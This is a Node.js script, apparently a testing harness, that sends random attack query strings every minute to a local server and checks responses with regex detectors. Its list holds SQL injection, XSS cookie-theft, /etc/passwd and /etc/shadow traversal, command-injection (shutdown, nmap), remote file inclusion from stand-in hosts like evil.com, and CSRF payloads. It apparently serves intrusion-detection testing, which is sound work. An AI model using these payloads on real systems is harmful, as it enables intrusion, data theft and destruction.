const axios = require('axios');

// 서버 IP와 포트 설정
const IP = '127.0.0.1';
const PORT = 8445;

// 요청 간격 (1분 = 60,000ms)
const INTERVAL = 60 * 1000;

// 공격용 쿼리 문자열 목록
const attackQueries = [
  // SQL Injection
  "?id=1 UNION SELECT username, password FROM users--",
  "?id=1 OR 1=1",
  "?search=%27%20OR%20%271%27%3D%271",
  "?cmd=DROP TABLE users",
  "?q=<script>alert('XSS')</script>",
  "?file=../../etc/passwd",
  "?cmd=ping -n 10 127.0.0.1",
  "?page=http://evil.com/shell.txt",
  "?log=document.cookie",
  "?redirect=window.location='http://attacker.com'",
  "?user=admin'--",
  "?input=' OR ''='",
  "?debug=true",
  "?config=../../../../config.php",
  "?lang=../../../../etc/passwd",
  "?search=<img src=x onerror=alert('XSS')>",
  "?query=<svg/onload=alert('XSS')>",
  "?redirect=http://evil.com",
  "?include=http://malicious.site/include.php",
  "?exec=cat /etc/passwd",

  // 추가된 SQL Injection 예시
  "?id=1' OR '1'='1",
  "?id=1; DROP TABLE users",
  "?id=1' UNION SELECT null, username, password FROM users",
  "?id=-1 UNION ALL SELECT NULL, NULL, NULL --",
  "?search=%27 UNION ALL SELECT NULL, username, password FROM users --",

  // XSS (Cross-Site Scripting)
  "?search=<img src=\"x\" onerror=\"alert('XSS')\">",
  "?q=<svg/onload=alert('XSS')>",
  "?comment=<script>alert('XSS')</script>",
  "?input=<script>alert('XSS')</script>",
  "?search=<script>alert('XSS')</script>",
  "?search=<script>alert('XSS')</script><img src=x onerror=alert('XSS')>",
  "?search=<iframe src='javascript:alert(\"XSS\")'></iframe>",

  // Directory Traversal (디렉토리 탐색)
  "?file=../../../etc/passwd",
  "?file=../../../../../../etc/hosts",
  "?file=../../etc/shadow",
  "?file=../../../../etc/passwd",
  "?file=../../../../../../etc/hostname",

  // Command Injection (명령어 삽입)
  "?cmd=ls",
  "?cmd=whoami",
  "?cmd=echo hello",
  "?cmd=cat /etc/passwd",
  "?cmd=ping -c 4 127.0.0.1",
  "?cmd=shutdown -h now",
  "?cmd=nmap -sP 192.168.1.0/24",

  // Remote File Inclusion (RFI, 원격 파일 포함 공격)
  "?page=http://evil.com/malicious_file.php",
  "?include=http://attacker.com/malicious_script.php",
  "?page=http://evil.com/shell.php",
  "?include=http://attacker.com/malicious_code.php",
  "?page=http://evil.com/exploit.php",

  // Local File Inclusion (LFI, 로컬 파일 포함 공격)
  "?file=php://input",
  "?file=php://filter/read=convert.base64-encode/resource=index.php",
  "?file=php://filter/convert.base64-encode/resource=/etc/passwd",
  "?file=php://filter/read=convert.base64-encode/resource=php://stderr",
  "?file=php://filter/convert.base64-encode/resource=php://memory",
  "?file=php://filter/read=convert.base64-encode/resource=php://var/log/apache2/access.log",

  // Session Fixation
  "?PHPSESSID=1234567890abcdef",
  "?PHPSESSID=abcdef1234567890",

  // CSRF (Cross-Site Request Forgery)
  "?action=delete_user&userid=12345",
  "?action=logout&sessionid=abcdef1234567890",
  "?action=update_password&new_password=1234abcd",
  "?action=transfer_money&amount=1000&to_account=attacker_account",
  "?action=add_to_cart&item_id=12345&quantity=10",
  
  // 기타 공격 예시들
  "?input=<img src='x' onerror='alert(document.cookie)'>",
  "?input=%3Cscript%3Ealert(document.cookie)%3C/script%3E",
  "?action=edit_user&id=1; DROP TABLE users",
  "?user=admin' OR 1=1 --",
  "?input=javascript:alert('XSS')",
  "?cmd=cat /etc/hosts",
  "?page=http://evil.com/exploit.php?param=%2Fetc%2Fpasswd"
];


// 정규식 정의 (예: SQL injection, XSS, Directory Traversal)
const attackPatterns = [
  {
    type: 'SQL Injection',
    pattern: /\b(SELECT|INSERT|UPDATE|DELETE|UNION|DROP|CREATE\s+TABLE|ALTER\s+TABLE|EXEC|DECLARE|CAST)\b/i
  },
  {
    type: 'XSS',
    pattern: /<script[\s\S]*?>[\s\S]*?<\/script>|<script[\s\S]*?>/i
  },
  {
    type: 'Directory Traversal',
    pattern: /\.\.\//i
  },
  {
    type: 'Command Injection',
    pattern: /(\bexec\(|system\(|shell_exec\()|ping\s+/i
  },
  // 추가적인 패턴들을 여기에 삽입할 수 있습니다.
];

// 무작위 쿼리 선택
function getRandomQuery() {
  const randomIndex = Math.floor(Math.random() * attackQueries.length);
  return attackQueries[randomIndex];
}

// 공격 탐지 함수
function detectAttack(responseData) {
  let detected = [];
  attackPatterns.forEach(pattern => {
    if (pattern.pattern.test(responseData)) {
      detected.push(pattern.type);
    }
  });
  return detected;
}

// GET 요청 전송
async function sendRequest() {
  const query = getRandomQuery();
  const url = `http://${IP}:${PORT}/${query}`;
  
  console.log(`\n[요청 전송] ${url}`);

  try {
    const res = await axios.get(url);

    console.log(`[응답] 상태 코드: ${res.status}`);

    // 응답 HTML을 한 줄로 압축하고, 앞부분 200자만 출력
    const oneLineHTML = res.data.replace(/\s+/g, ' ').trim().slice(0, 200);
    console.log('[응답 HTML] ');
    console.log(oneLineHTML);

    // 공격 탐지
    const detectedAttacks = detectAttack(res.data);
    if (detectedAttacks.length > 0) {
      console.log(`[경고] 탐지된 공격: ${detectedAttacks.join(', ')}`);
    } else {
      console.log('[탐지] 공격 없음');
    }

  } catch (err) {
    console.error('[요청 실패]', err.message);
  }
}

// 최초 실행 + 반복 실행
sendRequest();
setInterval(sendRequest, INTERVAL);
